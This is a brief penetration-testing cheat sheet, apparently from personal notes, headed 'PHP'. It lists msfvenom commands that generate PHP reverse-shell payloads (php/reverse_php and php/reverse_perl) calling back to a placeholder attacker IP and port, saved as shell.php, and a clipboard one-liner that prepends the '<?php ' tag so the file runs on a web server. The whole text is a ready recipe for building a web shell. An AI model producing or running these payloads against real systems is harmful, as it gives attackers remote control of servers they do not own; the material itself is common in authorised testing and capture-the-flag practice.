# PHP

`$ msfvenom -p php/reverse_php lhost=<IP> lport=<PORT> -f raw -o shell.php`

`$ msfvenom -p php/reverse_perl lhost=<IP> lport=<PORT> -f raw -o shell.php`

`$ cat shell.php | xclip -selection clipboard && echo '<?php ' | tr -d '\n'> shell.php && xclip -selection clipboard -o >> shell.php`